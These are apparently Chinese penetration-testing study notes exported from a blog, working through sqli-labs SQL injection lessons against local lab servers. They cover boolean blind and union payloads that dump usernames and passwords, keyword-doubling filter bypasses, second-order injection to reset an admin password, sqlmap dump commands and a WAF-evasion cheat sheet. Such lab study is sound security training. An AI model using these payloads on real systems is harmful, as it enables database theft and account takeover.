&amp;#x20;<br><code>1')and'1'=('1</code>成功闭合<br>没有报错回显，就使用布尔盲注 <a name="EfVmh"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>经过测试发现单独输入select和union时候，不会被过滤掉</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断库长<span class="token number">1</span><span class="token string">')and(length(database())=8)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>返回正常,数据库长度为8逐一字符判断数据库名称<span class="token number">1</span><span class="token string">')and(ascii(substr((database()),1,1))=115)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>返回正常,s<span class="token punctuation">..</span>.判断数据表长度<span class="token number">1</span><span class="token string">')and(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显数据表串起来长为29<span class="token punctuation">..</span>.逐一字符判断数据表名称<span class="token number">1</span><span class="token string">')and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=101)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显,e<span class="token punctuation">..</span>.判断列长<span class="token number">1</span><span class="token string">')and(length((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='</span><span class="token function">users</span><span class="token string">')))=20)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显,列长串起来是为20<span class="token punctuation">..</span>.逐一字符判断字段名称<span class="token number">1</span><span class="token string">')and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='</span><span class="token function">users</span><span class="token string">')),1,1))=105)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显,i<span class="token punctuation">..</span>.逐一字符判断字段内容<span class="token number">1</span><span class="token string">')and(ascii(substr((select(group_concat(username,0x7e,password))from(users)),1,1))=68)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>显示正常,D<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less25</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/AND/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Alll Your ‘OR’ and AND’ belong to us.</p></blockquote><p>‘and’,’or’和’AND’,’OR’被<strong>过滤</strong> <a name="VYZoO"></a></p><h1 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h1><p><code>?id=1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>可看出是**单引号’**闭合 <a name="ua3BP"></a></p><h1 id="测试字段数"><a href="#测试字段数" class="headerlink" title="测试字段数"></a>测试字段数</h1><p><code>1' order by 4 --+</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘der by 4– ‘ LIMIT 0,1’ at line 1</p></blockquote><p>or被过滤了。换大写试试。<br><code>1' ORder by 4 --+</code><br>同样的报错，看来大写也被过滤了。试试双写or ‘oorr’<br><code>1' oorrder by 4--+</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>Unknown column ‘4’ in ‘order clause’</p></blockquote><p>没有第4列<br><code>1' oorrder by 3--+</code>返回正常<br>有3个字段。</p><p><a name="tls7t"></a></p><h1 id="检查回显点"><a href="#检查回显点" class="headerlink" title="检查回显点"></a>检查回显点</h1><p><code>-1' union select 1,2,3-- +</code><br>显示2，3是回显点 <a name="DJ9KV"></a></p><h1 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h1><p><code>-1' union select 1,2,(select database())-- +</code> <a name="yJOW1"></a></p><h1 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h1><p><code>-1' union select 1,2,(select group_concat(table_name) from info**or**rmation_schema.tables where table_schema=database())--+</code> <a name="za0hf"></a></p><h1 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h1><p><code>-1' union select 1,2,(select group_concat(column_name) form info**or**rmation_schema.cloumns where table_schema=database() and table_name='users')--+</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘table_name=’users’)– ‘ LIMIT 0,1’ at line 1</p></blockquote><p>and 被过滤了，双写and    ‘aandnd’<br><code>-1' union select 1,2,(select group_concat(column_name) from info**or**rmation_schema.columns where table_schema=database() a**and**nd table_name='users')--+</code> <a name="qEq7I"></a></p><h1 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h1><p><code>-1' union select 1,2,(select group_concat(username,0x7e,passwo**or**rd) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less24</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less24/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less24/</url>
      
        <content type="html"><![CDATA[<p><a name="Zvqbq"></a></p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into users ( username, password) values(<span class="token entity" title="\&quot;">\"</span><span class="token variable">$username</span><span class="token entity" title="\&quot;">\"</span>, <span class="token entity" title="\&quot;">\"</span><span class="token variable">$pass</span><span class="token entity" title="\&quot;">\"</span>)"</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='<span class="token variable">$pass</span>' where username='<span class="token variable">$username</span>' and password='<span class="token variable">$curr_pass</span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>二次注入</strong>：二次注入是存储型注入。<br>可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。<br>恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，<br>当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p></blockquote><p>比如输入了admin’ #，网站则会将’和#转义后进行SQL查询，<br>但是最后存入数据库中的结果仍然是admin’ #（并没有转义存储）。</p><blockquote><p>简言之就是将脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，<br>当下一次调用该数据时，该数据就会拼接到其他查询语句中造成注入。</p></blockquote><p><img src="../../assets/ni93xt8pwhh5ruwc/1668606367726-3c955835-31b2-4e4c-bbce-4a10e4212514.png" alt="image.png"> <a name="tu84T"></a></p><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>首先注册一个新的账号，然后登录该账号&amp;#x20;<br><img src="../../assets/ni93xt8pwhh5ruwc/1668650181397-1d948aa0-e337-454b-8c7e-f3988e2dae40.png" alt="image.png"><br>然后登录该账号&amp;#x20;<br><img src="../../assets/ni93xt8pwhh5ruwc/1668651240933-a972cf98-6d8b-451b-88d8-1994838d73a2.png" alt="image.png"><br><code>**admin'-- +**</code> <a name="HPMiU"></a></p><h2 id="登录修改密码"><a href="#登录修改密码" class="headerlink" title="登录修改密码"></a>登录修改密码</h2><p>登录之后，修改密码，<br>该修改密码功能的语句变为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'$pass'</span> where <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">'admin'</span>-- +<span class="token string">'and password='</span><span class="token variable">$curr_pass</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么真正奏效的语句则是</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'$pass'</span> WHERE <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候我们就是在进行越权改变管理员的密码，<br>从数据库中抽出我们注册的新账户，用该账户越权修改 管理员的密码 &amp;#x20;<br><img src="../../assets/ni93xt8pwhh5ruwc/1668651533559-bc5112bd-3656-49d1-af60-a80f5a8b4cb0.png" alt="image.png"><br>将密码改为<strong>1234</strong>，</p><blockquote><p>Password successfully updated</p></blockquote><p>然后用管理员的账户，登录密码1234 &amp;#x20;<br><img src="../../assets/ni93xt8pwhh5ruwc/1668651459102-54e393e7-5449-4f4c-acb4-a55b8fbcd7f8.png" alt="image.png"><br>&amp;#x20;管理员账户登录成功</p><p><img src="./../../asset/1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less23</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less23/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less23/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">"/#/"</span><span class="token punctuation">;</span><span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string">"/--/"</span><span class="token punctuation">;</span><span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token variable">$reg</span>, <span class="token variable">$replace</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token variable">$reg1</span>, <span class="token variable">$replace</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过源码发现**#和–都被被过滤为空字符串**<br>只有想方法将闭合符号消耗完毕，让后台能够接收，处理掉原有的闭合方式 单引号’</p><blockquote><p>Please input the ID as parameter with numeric value</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1<span class="token string">' or updatexml(1,concat(0x7e,(select database()),0x7e),1) and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>**and '1'='1**</code>将后面的单引号闭合消耗完毕。</p><p>按照常规get型传参注入 <a name="rL8Hl"></a></p><h1 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h1><p><code>?id=1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-23\index.php</strong> on line <strong>38</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>闭合方式单引号’ <a name="lh1Tf"></a></p><h1 id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h1><p><code>?id=1' order by 4 **and '1'='1**</code><br><code>?id=1' order by 3 **and '1'='1**</code><br>字段 3个 <a name="sFNaN"></a></p><h1 id="判断回显点"><a href="#判断回显点" class="headerlink" title="判断回显点"></a>判断回显点</h1><p><code>?id=-1' union select 1,2,**'3**</code><br>回显点2,3 <a name="xvLPE"></a></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看所有数据库名称?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select database()),'</span><span class="token number">3</span> 查看使用数据表名称?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'</span><span class="token number">3</span>查看字段名?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),'</span><span class="token number">3</span>查看字段?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select group_concat(username,0x7e,password) from users),'</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="iqiEO"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">探测注入点sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span>爆破数据库名sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> --current-db爆破数据表sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span> 脱库sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>6.2SQL注入之sqlmap使用(post注入)</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.2sql-zhu-ru-zhi-sqlmap-shi-yong-post-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.2sql-zhu-ru-zhi-sqlmap-shi-yong-post-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之sqlmap使用(post注入)</h1><p>POST型：与数据库交互是通过post数据进行，URL不可见</p><h3>利用sqlmap进行POST注入，常见的有三种方法:</h3><h2>注入方式一：</h2><p><strong>1.用Burp抓包，然后保存抓取到的内容。例如：保存为1.txt,然后把它放至某个目录下</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/4acf54c747204860a73fe74a42a8c8c2.png" alt="image.png" class="align-none"></p><p><strong>2.列数据库:</strong></p><p>sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname --dbs</p><p>也可以使用  *  指定需要测试的参数</p><p><strong>it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</strong><br>它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n]  输入"Y"</p><p><strong>for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]</strong><br>对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？ [Y/n] 输入"N"</p><p><strong>POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</strong><br>POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N]  输入"Y"</p><h3>3.猜表</h3><p>选择一个数据库，比如选test</p><p>sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname -D test --tables</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/583ad73419114e1ea19656c1102841d1.png" alt="image.png" class="align-none"></p><p><strong>4.猜列</strong></p><p>sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname -D test  -T t1 --columns</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/f96cf3e6a13d4e90a7e3a051bf3fe64f.png" alt="image.png" class="align-none"></p><h2>注入方式二：自动搜索表单的方式</h2><p>sqlmap.py  -u "<a href="http://localhost/sqli-labs-master/Less-11/index.php" target="_blank">http://localhost/sqli-labs-master/Less-11/index.php</a>" --forms</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/d1b1a089b2824e80a36551e501cfbe64.png" alt="image.png" class="align-none"></p><p>do you want to test this form? [Y/n/q]<br>要测试此表单吗?[Y/n/q]  输入"Y"</p><p>do you want to fill blank fields with random values? [Y/n]<br>是否要填充带有随机值的空白字段? [Y/n]  输入"Y"</p><p>it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]<br>它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n] 输入"Y"</p><p>for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]<br>对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？[Y/n]  输入"N"</p><p>POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]<br>POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N]  输入"N"</p><p>do you want to exploit this SQL injection? [Y/n]<br>你想利用SQL注入？ 输入"Y"</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/490d416ed490474db5c6b8d6adcca84e.png" alt="image.png" class="align-none"></p><p>常用命令：</p><pre><code>-r表示加载一个文件，-p指定参数--current-db 当前数据库--forms 自动检测表单-data   </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>6.1SQL注入之sqlmap使用(get型注入)</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.1sql-zhu-ru-zhi-sqlmap-shi-yong-get-xing-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.1sql-zhu-ru-zhi-sqlmap-shi-yong-get-xing-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之sqlmap使用(get型注入)</h1><h4>一、SQLMap介绍</h4><h5>1、Sqlmap简介：</h5><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</p><h5>2、Sqlmap支持的注入方式：</h5><p>Sqlmap全面支持六种SQL注入技术：</p><ul><li>基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li><li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li><li>联合查询注入：在可以使用Union的情况下的注入。</li><li>堆查询注入：可以同时执行多条语句时的注入。</li><li>带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。</li></ul><h4>二、SQLMap使用：</h4><h5>1、判断是否存在注入：</h5><p>假设目标注入点是 <code>http://127.0.0.1/sqli-labs/Less-1/?id=1</code>，判断其是否存在注入的命令如下：</p><pre><code>sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1</code><p><code></code></p></pre><p></p><p>当注入点后面的参数大于等于两个时,需要加双引号，如下所示。</p><pre><code>sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1&amp;uid=2"</code><p><code></code></p></pre><p></p><p>运行完判断是否存在注入的语句后，爆出一大段代码，这里有三处需要选择的地方：第一处的意思为检测到数据库可能是MySQL，是否需要跳过检测其他数据库；第二处的意思是在“level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测；第三处的意思是参数 <code>id</code>存在漏洞，是否要继续检测其他参数，一般默认按回车键即可。</p><p>常用命令：</p><pre><code>-u:用于get提交方式，后面跟注入的url网址--level--risk<p>--dbs：获取所有数据库<br>--tales：获取所有数据表<br>--columns：获取所有字段<br>--dump：打印数据</p></code><p><code>-D：查询选择某个库<br>-T：查询选择某个表<br>-C：查询选择某个字段<br>level：执行测试的等级（1<del>5，默认为1），使用-level参数并且数值&gt;=2的时候会检查cookie里面的参数，<br>当&gt;=3时检查user-agent和refereer<br>risk：执行测试的风险（0</del>3,默认为1），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，<br>3会增加or语句的sql注入 </code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>5.1SQL注入之WAF绕过</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/5-sql-zhu-ru-zhi-waf-rao-guo/5.1sql-zhu-ru-zhi-waf-rao-guo/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/5-sql-zhu-ru-zhi-waf-rao-guo/5.1sql-zhu-ru-zhi-waf-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之WAF绕过</h1><h3><code>WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。</code></h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647683310000/eaf7c52124254ea59a9cba144ae61b53.png" alt="image.png" class="align-none"></p><h1>关键词大小写绕过</h1><pre><code>    有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过<pre><code>举例： union select ---&amp;gt; unIOn SeLEcT</code></pre></code><p><code></code></p></pre><p></p><h1>编码绕过</h1><pre><code>    针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等.<pre><code>举例：union select 1,2,3# =union%0aselect 1\u002c2,3%23</code></pre></code><p><code></code></p></pre><p></p><h1>双写绕过</h1><pre><code>    部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，这时，我们可以通过双写来进行绕过。<pre><code>举例：UNIunionON ，SELselectECT anandd</code></pre></code><p><code></code></p></pre><p></p><h1>换行(\N)绕过</h1><pre><code>    举例：select * from admin where username = \N union select 1,user() from admin</code></pre><h1>注释符内联注释绕过：</h1><pre><code><pre><code>union selecte =/*!union*/ select注释符里感叹号后面的内容会被mysql执行。</code></pre></code><p><code></code></p></pre><p></p><h1>同义词替换</h1><pre><code>    and=&amp;&amp;<pre><code>or=||=(等于号)=&amp;lt;、&amp;gt;空格不能使用=%09,%0a,%0b,%0c,%0d,%20,%a0等注：%0a是换行也可以替代空格</code></pre></code><p><code></code></p></pre><p></p><h1>HTTP参污染</h1><pre><code>    对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。<pre><code>举例：?id=1&amp;amp;id=2&amp;amp;id=3?id=1/**&amp;amp;id=-1%20union%20select%201,2,3%23*/</code></pre></code><p><code></code></p></pre><p></p><h3><code>WAF绕过的思路就是让WAF的检测规则，识别不到你所输入的敏感字符，利用上述所介绍的知识点，灵活结合各种方法，从而可以增加绕过WAF的可能性</code></h3><pre><code>order by绕过：%20/*//--/*/  V4.0联合绕过：union /*!--+/*%0aselect/*!1,2,3*/ --+from绕过： /*!06447%23%0afrom*/</code><p><code></code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.6SQL注入之堆叠注入</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.6sql-zhu-ru-zhi-dui-die-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.6sql-zhu-ru-zhi-dui-die-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之堆叠注入</h1><p>在SQL中，分号 ；是用来表示一条sql语句的结束，试想一下我们在 ； 结束一个sql语句后面继续构造下一个语句<br>会不会一起执行？因此这个想法也就造就了堆叠注入。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/830dbff902c24ed4a6d9b250462658ed.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/5a9c5e81ccd64a0b904801ad549a6beb.png" alt="image.png" class="align-none"></p><p>而union injection（联合注入）也是将两条语句合并在一起<br>两者之间有什么区别？区别就在于union执行语句类型有限，可以用来执行查询语句，而堆叠注入可以执行的是任意语句</p><p>Less-38</p><p><a href="http://localhost/sqli-labs-master/Less-38/?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2722%27,%27mc%27,%27hello%27)--+" target="_blank">http://localhost/sqli-labs-master/Less-38/?id=1';insert into users(id,username,password) values ('22','mc','hello')--+</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/a69172f8e1d44093821b77231f9fc0bd.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.5SQL注入之加解密注入</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.5sql-zhu-ru-zhi-jia-jie-mi-zhu-ru/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.5sql-zhu-ru-zhi-jia-jie-mi-zhu-ru/</url>
      
